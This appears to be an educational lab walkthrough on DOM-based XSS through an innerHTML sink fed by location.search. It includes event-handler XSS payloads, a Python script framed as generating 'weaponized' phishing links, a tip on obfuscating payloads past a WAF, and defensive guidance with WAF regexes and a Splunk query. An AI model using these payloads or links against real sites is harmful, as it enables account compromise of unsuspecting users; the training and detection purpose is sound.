
# Lab Walkthrough: DOM XSS in `innerHTML` Sink using `location.search`

* **Vulnerability Type:** DOM-Based Cross-Site Scripting (XSS)
* **Target Context:** Client-Side JavaScript (`innerHTML` Sink)
* **Skill Level:** Apprentice (Beginner)
* **Estimated Completion Time:** 10–15 minutes
* **Lab Status:** Solved

---

## Legal & Ethical Disclaimer

> [!WARNING]  
> The scripts, payloads, methodologies, and technical documentation contained in this repository are strictly intended for educational exercises, CTF competitions, and authorized security assessments. Executing these tests against infrastructure without prior, explicit, written engagement contracts is illegal. The author disclaims all liability for misuse.

---

## Table of Contents

1. [Vulnerability Architecture & Mechanism](#1-vulnerability-architecture--mechanism)
2. [Lab Objectives & Verification Criteria](#2-lab-objectives--verification-criteria)
3. [Step-by-Step Exploitation Flow](#3-step-by-step-exploitation-flow)
4. [JavaScript Sinks Comparison](#4-javascript-sinks-comparison)
5. [Automated Exploitation Script (Python PoC)](#5-automated-exploitation-script-python-poc)
6. [Defense, Hardening & Secure Coding](#6-defense-hardening--secure-coding)
7. [SIEM Detection & Telemetry Analysis](#7-siem-detection--telemetry-analysis)
8. [Troubleshooting & Diagnostic Runbook](#8-troubleshooting--diagnostic-runbook)
9. [References & Standards](#9-references--standards)

---

## 1. Vulnerability Architecture & Mechanism

DOM XSS occurs when an application contains client-side JavaScript that processes data from an untrusted source (like the URL) in an unsafe way, usually by writing that data to a dangerous sink within the Document Object Model (DOM).

* **The Source (`location.search`):** This JavaScript property reads the query string portion of the URL (e.g., `?search=payload`).
* **The Sink (`innerHTML`):** A property used to get or set the HTML markup contained within an element. When untrusted input is assigned directly to `innerHTML`, the browser parses it as raw HTML, creating an execution vector.

**The HTML5 Security Nuance:** 
The HTML5 specification explicitly states that `<script>` tags inserted via `innerHTML` **will not execute**. To achieve code execution in this sink, an attacker must use alternative vectors, such as event handlers (e.g., `onload`, `onerror`) attached to other HTML elements like `<img>`, `<svg>`, or `<body>`.

```text
┌────────────────────────────────────────────────────────────────────────┐
│                        DOM XSS (innerHTML) FLOW                        │
└────────────────────────────────────────────────────────────────────────┘

  [1. Attacker] Sends a crafted URL to the victim:
  [https://target.com/?search=](https://target.com/?search=)<img src=1 onerror=alert(1)>
           │
           ▼
  [2. Victim Browser] Loads the page. The server ignores the payload.
           │
           ▼
  [3. Client JS] Reads query string: 
  let query = new URLSearchParams(window.location.search).get('search');
           │
           ▼
  [4. Sink Execution] Assigns to DOM:
  document.getElementById('searchMessage').innerHTML = query;
           │
           ▼
  [5. Browser Parser] Attempts to load image source "1", fails, 
  fires the "onerror" event, and executes alert(1).

```

> **Learning Checkpoint 1:** Why doesn't `<script>alert(1)</script>` work in this lab? The browser's HTML5 parser actively prevents `script` elements from executing when injected dynamically via the `innerHTML` property to mitigate simple XSS attacks. Attackers bypass this by forcing the browser to evaluate JavaScript within an event handler context instead.

---

## 2. Lab Objectives & Verification Criteria

* **Target Surface:** The blog's search tracking functionality.
* **Primary Objective:** Exploit the `innerHTML` sink using `location.search` to execute arbitrary JavaScript.
* **Validation Signal:** Triggering the `alert()` function successfully via an injected event handler.

---

## 3. Step-by-Step Exploitation Flow

### Phase 1: Reconnaissance & Source Mapping

* Navigate to the target application's search bar.
* Input a harmless tracking string (e.g., `CyberTest123`).
* Open the browser's Developer Tools (F12) and inspect the DOM (Elements tab).
* Notice that your search term is injected into an HTML element (e.g., a `<span>` or `<div>`).
* Check the JavaScript sources (Sources tab) and observe the application logic:
`document.getElementById('searchMessage').innerHTML = query;`

### Phase 2: Payload Construction

* Because the sink is `innerHTML`, we know a standard `<script>` tag will fail.
* We must construct a payload utilizing an HTML element that executes JavaScript upon a state change or error.
* **Payload Choice:** `<img src=x onerror=alert(1)>`
* Creates an image element.
* Sets the source to `x` (an invalid URL).
* Defines the `onerror` event handler to execute `alert(1)` when the image inevitably fails to load.



### Phase 3: Injection & Execution

* Enter the payload into the search box: `<img src=1 onerror=alert(1)>`
* Click "Search".
* *Result:* The browser attempts to render the DOM, fails to load the image `1`, triggers the `onerror` attribute, and executes the alert box.

> **Learning Checkpoint 2:** Could you use `<svg onload=alert(1)>` here? Yes. The `<svg>` element with an `onload` handler is another highly reliable vector for `innerHTML` sinks because the event fires immediately as the browser renders the vector graphic element.

---

## 4. JavaScript Sinks Comparison

Selecting the right payload depends entirely on understanding how the JavaScript sink processes the data.

| JavaScript Sink | Executes `<script>` Tags? | Executes Event Handlers (`onerror`)? | Safety Level |
| --- | --- | --- | --- |
| `document.write()` | **Yes** | **Yes** | Highly Dangerous |
| `innerHTML` | **No** (HTML5 Spec) | **Yes** | Highly Dangerous |
| `eval()` | N/A (Executes raw JS) | N/A (Executes raw JS) | Highly Dangerous |
| `textContent` | **No** | **No** | **Safe** |
| `innerText` | **No** | **No** | **Safe** |

> **Learning Checkpoint 3:** If you discover a vulnerability where data flows into `eval()`, do you need HTML tags? No. `eval()` executes raw JavaScript directly. You would simply inject `alert(1)`, not `<script>alert(1)</script>`.

---

## 5. Automated Exploitation Script (Python PoC)

DOM XSS is executed entirely client-side. The following script demonstrates how an attacker programmatically generates weaponized URLs to deliver the payload via social engineering or phishing.

```python
#!/usr/bin/env python3
"""
DOM XSS innerHTML Weaponized Link Generator (PoC)
Generates URL-encoded payloads targeting the location.search source.
"""

import urllib.parse
import sys

def generate_phishing_link(target_url):
    # Event handler payload required for innerHTML bypass
    raw_payload = '<img src="x" onerror="alert(1)">'
    
    # URL encode the payload to ensure safe transport and parsing
    encoded_payload = urllib.parse.quote(raw_payload)
    
    # Construct the final weaponized URL
    weaponized_link = f"{target_url}/?search={encoded_payload}"
    
    print("[*] Generating Weaponized DOM XSS Link (innerHTML context)...")
    print(f"[+] Distribute this URL to target: \n{weaponized_link}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 dom_innerHTML_gen.py <target_base_url>")
        sys.exit(1)
        
    target = sys.argv[1].rstrip('/')
    generate_phishing_link(target)

```

---

## 6. Defense, Hardening & Secure Coding

The most effective way to eliminate DOM XSS is to replace unsafe sinks with safe alternatives.

* **Use Safe Sinks:** Replace `innerHTML` with `textContent` or `innerText`. These properties treat the injected data strictly as text, neutralizing all HTML tags and event handlers.
* *Vulnerable:* `element.innerHTML = userInput;`
* *Secure:* `element.textContent = userInput;`


* **Client-Side Sanitization:** If raw HTML rendering is a strict business requirement, the input *must* be sanitized using a robust, actively maintained library before hitting the sink.
* *Secure:* `element.innerHTML = DOMPurify.sanitize(userInput);`


* **Content Security Policy (CSP):** Implement strict CSP headers to prevent the execution of inline event handlers (blocking `onerror`, `onclick`, etc.).
* *Header:* `Content-Security-Policy: default-src 'self'; script-src 'self'` (Avoid using `'unsafe-inline'`).



---

## 7. SIEM Detection & Telemetry Analysis

Because the payload resides in the `location.search` (`?`) parameter, it is logged by the backend web server, making it detectable via standard proxy or WAF telemetry.

### WAF / Detection Rule Examples (Regex)

* **Image Error Injection:** `(?i)<\s*img.*?\bonerror\s*=`
* **SVG Load Injection:** `(?i)<\s*svg.*?\bonload\s*=`
* **Event Handler Blanket Catch:** `(?i)\b(onmouseover|onerror|onload|onclick|onfocus)\s*=`

### Splunk Search Query (SPL)

```spl
index=web_proxy sourcetype=access_combined 
| regex uri_query="(?i)(<img|<svg|onerror=|onload=|alert\()"
| stats count by src_ip, uri_path, uri_query
| where count > 0

```

---

## 8. Troubleshooting & Diagnostic Runbook

| Symptom | Probable Cause | Corrective Action |
| --- | --- | --- |
| **Payload renders literally as text** | Safe sink is in use. | Inspect the JS file. If the app uses `textContent`, HTML injection is impossible here. |
| **No alert, but payload is in the DOM** | Used a `<script>` tag. | The `innerHTML` sink suppresses `<script>` execution. Switch to an event-handler payload like `<img src=x onerror=alert(1)>`. |
| **Payload is URL-encoded in the DOM** | Double-encoding or framework protection. | The JavaScript might be calling `decodeURIComponent()` improperly, or a frontend framework (like React) is auto-escaping the data. |
| **HTTP 403 Forbidden** | WAF Block. | The WAF detected the `onerror=` string. Obfuscate the payload using URL encoding or alternative event handlers (`onanimationstart`). |

---

## 9. References & Standards

* [PortSwigger: DOM-Based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
* [OWASP Top 10-2021: A03 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
* [OWASP: DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
* [Cure53: DOMPurify](https://github.com/cure53/DOMPurify)

```

> **Key Insight:** DOM XSS exploits the client's local execution environment, bypassing many traditional backend filters. When exploiting `innerHTML` sinks, understanding HTML5 parsing rules is critical: standard `<script>` tags are neutralized, requiring attackers to pivot to attribute-based event handlers (like `onerror`) to force code execution.

```
